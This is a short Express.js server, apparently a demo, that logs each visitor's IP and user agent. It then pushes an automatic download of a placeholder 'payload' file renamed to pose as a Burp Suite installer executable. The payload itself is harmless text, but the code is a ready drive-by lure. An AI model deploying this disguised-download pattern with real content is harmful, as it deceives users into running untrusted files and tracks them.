const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const port = 4000;

// Create a payload file if it doesn't exist
const payloadPath = path.join(__dirname, 'payload.txt');
if (!fs.existsSync(payloadPath)) {
    fs.writeFileSync(payloadPath, 'This is a simulated payload file for demonstration purposes.');
}

// Middleware to handle direct downloads
app.use(express.static(path.join(__dirname)));

// Auto-download endpoint
app.get('/', (req, res) => {
    console.log('Download request received');
    
    // Log user data
    console.log('User information:', {
        ip: req.ip,
        userAgent: req.get('User-Agent'),
        timestamp: new Date()
    });

    // Serve payload file automatically
    res.download(payloadPath, 'burp_suite_community_installer.exe', (err) => {
        if (err) {
            console.error('Error sending payload:', err);
            res.status(500).send('Error downloading file');
        }
    });
});

app.listen(port, () => {
    console.log(`Auto-download server running at http://localhost:${port}`);
});




